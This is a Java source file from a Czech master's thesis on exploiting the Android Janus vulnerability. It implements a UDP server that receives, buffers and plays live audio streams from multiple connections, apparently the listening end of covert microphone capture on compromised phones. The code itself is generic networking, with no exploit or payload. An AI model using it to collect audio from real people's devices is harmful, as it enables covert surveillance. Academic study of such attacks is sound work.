// Tento kód je součást diplomové práce "Využití zranitelnosti Janus na operačním systému Android"
// Autor: Bc. Vít Souček (soucevi1@fit.cvut.cz)
//
// Použité zdroje:
//    - zmíněné přímo v dokumentačních komentářích


package com.company;

import javax.sound.sampled.*;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicReference;

public class ServerThread implements Runnable {

    public volatile boolean status = true;

    public volatile AtomicReference<String> activeConnection = new AtomicReference<>();
    public Map<String, Connection> connections;
    private final int connectionTimeout = 2000; // 2 sekundy

    private Thread t;
    private ExecutorService pool;
    ScheduledExecutorService timeoutChecker;

    private int sampleRate = 44100;
    private int bufferLen = 26880 * 20;
    private byte[] receiveData = new byte[bufferLen];

    private SourceDataLine sourceDataLine;

    private DatagramSocket serverSocket;

    private int ringBufferSize;

    /**
     * Konstruktor.
     * Inicializuje maximální velikost bufferu a threadpool pro zpracovávání přijatých dat.
     *
     * @param maxMemory Maximální velikost bufferu (v MB) pro přednahrávání spojení.
     * @param threadCnt Počet vláken pro zpracovávání přijatých dat.
     */
    public ServerThread(int maxMemory, int threadCnt) {
        ringBufferSize = maxMemory * 1000000;
        pool = Executors.newFixedThreadPool(threadCnt);
        activeConnection.set("");

        System.out.println("[*] Buffer size set to: " + ringBufferSize + " B. (~ prerecorded " +
                ((ringBufferSize) / (2 * sampleRate)) / 60 + " minutes and " + ((ringBufferSize) / (2 * sampleRate)) % 60 +
                " seconds per connection)");
    }

    /**
     * Hlavní metoda této třídy.
     * Inicializuje prvky pro přehrávání zvuku a pak v cyklu:
     * - přijme data
     * - vytvoří objekt ConnectionTask a nechá pool, aby ho zpracoval
     */
    @Override
    public void run() {

        try {
            int port = 50005;
            serverSocket = new DatagramSocket(port);
        } catch (SocketException e) {
            e.printStackTrace();
        }

        initializeAudioPlayer();

        connections = new ConcurrentHashMap<>();

        startTimeoutChecker();

        while (status) {
            DatagramPacket packet = receivePacket();
            String senderID = getSenderID(packet);

            if (!connections.containsKey(senderID)) {
                System.out.println("[+] New connection: " + senderID);
                connections.put(senderID, new Connection(senderID, ringBufferSize));
            }

            Connection currentConnection = connections.get(senderID);

            currentConnection.updateTimestamp();

            // Pokud neexistuje aktivní spojení, bude aktivní toto aktuální
            if (activeConnection.get().equals("")) {
                activeConnection.set(senderID);
                System.out.println("[*] Active connection: " + activeConnection);
            }

            byte[] data = packet.getData();
            int dataLength = packet.getLength();
            Runnable task = new ConnectionTask(currentConnection, data, dataLength, senderID.equals(activeConnection.get()), sourceDataLine);
            pool.execute(task);
        }

        System.out.println("[*] Thread exiting");
        timeoutChecker.shutdown();
        pool.shutdown();
        sourceDataLine.drain();
        sourceDataLine.close();
    }

    /**
     * Kontrola, jestli nějaké spojení není hluché.
     * Každé 3 vteřiny se zkontroluje, jestli od některého ze spojení
     * nepřestala po nějakou dobu chodit data. Pokud ano, spojení je odstraněno.
     * <p>
     * Periodické spouštění vlákna bylo inspirováno odpovědí na StackOverflow.com otázku "Java Thread every X seconds"
     * autoři: Matt Ball, cletus
     * dostupné z: https://stackoverflow.com/a/3541686/6136143
     */
    private void startTimeoutChecker() {
        timeoutChecker = Executors.newSingleThreadScheduledExecutor();
        timeoutChecker.scheduleAtFixedRate(() -> {
            for (String connID : connections.keySet()) {
                Connection current = connections.get(connID);
                if (System.currentTimeMillis() - current.dataLastReceived > connectionTimeout) {
                    removeConnection(connID);
                }
            }
        }, 0, 3, TimeUnit.SECONDS);
    }

    /**
     * Odstraní spojení ze seznamu.
     * Pokud se spojení zrovna nahrává, je nahrávání zastaveno.
     *
     * @param connectionID ID spojení, které se má odstranit.
     */
    public void removeConnection(String connectionID) {
        if (connectionID.equals(activeConnection.get())) {
            activeConnection.set("");
        }

        if (connections.get(connectionID).isRecording()) {
            connections.get(connectionID).stopRecording();
        }

        if (connections.remove(connectionID) != null) {
            System.out.println("[-] Connection " + connectionID + " removed.");
        } else
            System.out.println("[X] Connection does not exist");
    }

    /**
     * Spustí kód objektu v odděleném vlákně.
     */
    void start() {
        System.out.println("[*] Starting the server thread.");
        if (t == null) {
            t = new Thread(this);
            t.start();
        }
    }

    /**
     * Přijme paket od jakéhokoliv zdroje.
     *
     * @return DatagramPacket s daty.
     */
    private DatagramPacket receivePacket() {
        DatagramPacket packet = new DatagramPacket(receiveData, receiveData.length);
        try {
            serverSocket.receive(packet);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return packet;
    }

    /**
     * Inicializuje všechny objekty potřebné pro přehrávání zvuku.
     * Inspirováno otázkou na StackOverflow.com "Stream Live Android Audio To Server" a odpovědí na ni.
     * autor otázky i odpovědi: chuckliddell0
     * dostupné z: https://stackoverflow.com/questions/15349987/stream-live-android-audio-to-server
     */
    private void initializeAudioPlayer() {
        AudioFormat format = new AudioFormat(sampleRate, 16, 1, true, false);
        DataLine.Info dataLineInfo = new DataLine.Info(SourceDataLine.class, format);

        try {
            sourceDataLine = (SourceDataLine) AudioSystem.getLine(dataLineInfo);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }

        try {
            sourceDataLine.open(format);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }
        sourceDataLine.start();

        FloatControl volumeControl = (FloatControl) sourceDataLine.getControl(FloatControl.Type.MASTER_GAIN);
        volumeControl.setValue(volumeControl.getMaximum());
    }

    /**
     * Získá zdrojovou IP adresu a port z
     * přijatého paketu.
     *
     * @param packet Přijatý DatagramPacket.
     * @return IP a port jako String ve formátu IP:port
     */
    private String getSenderID(DatagramPacket packet) {
        String addr = packet.getAddress().toString();
        if (addr.charAt(0) == '/') {
            addr = addr.substring(1);
        }
        int port = packet.getPort();
        return addr + ":" + port;
    }
}
